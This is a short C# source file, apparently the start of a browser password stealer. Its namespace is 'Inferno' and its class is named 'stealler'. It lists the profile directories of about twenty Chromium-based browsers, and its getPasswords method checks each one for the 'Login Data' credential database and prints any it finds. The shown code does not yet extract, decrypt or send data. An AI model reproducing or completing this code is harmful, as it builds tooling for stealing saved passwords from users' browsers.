using System;
using System.IO;

namespace Inferno
{
    internal class stealler
    {

		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		private static string[] paths = {
			@"Google\Chrome\User Data\Default",
			@"Google(x86)\Chrome\User Data\Default",
			@"Chromium\User Data\Default",
			@"Opera Software\Opera Stable",
			@"Amigo\User Data\Default",
			@"Vivaldi\User Data\Default",
			@"Orbitum\User Data\Default",
			@"Mail.Ru\Atom\User Data\Default",
			@"Kometa\User Data\Default",
			@"Comodo\Dragon\User Data\Default",
			@"Torch\User Data\Default",
			@"Comodo\User Data\Default",
			@"360Browser\Browser\User Data\Default",
			@"Maxthon3\User Data\Default",
			@"K-Melon\User Data\Default",
			@"Sputnik\Sputnik\User Data\Default",
			@"Nichrome\User Data\Default",
			@"CocCoc\Browser\User Data\Default",
			@"Uran\User Data\Default",
			@"Chromodo\User Data\Default",
			@"Yandex\YandexBrowser\User Data\Default"
        };

		



		public static void getPasswords()
        {


			foreach (string passwords_db in paths)
			{
				string db_location = appdata + passwords_db + "\\Login Data";
				if (File.Exists(db_location))
				{
					Console.WriteLine("Found " + db_location);




				}
			}

		}
    }
}
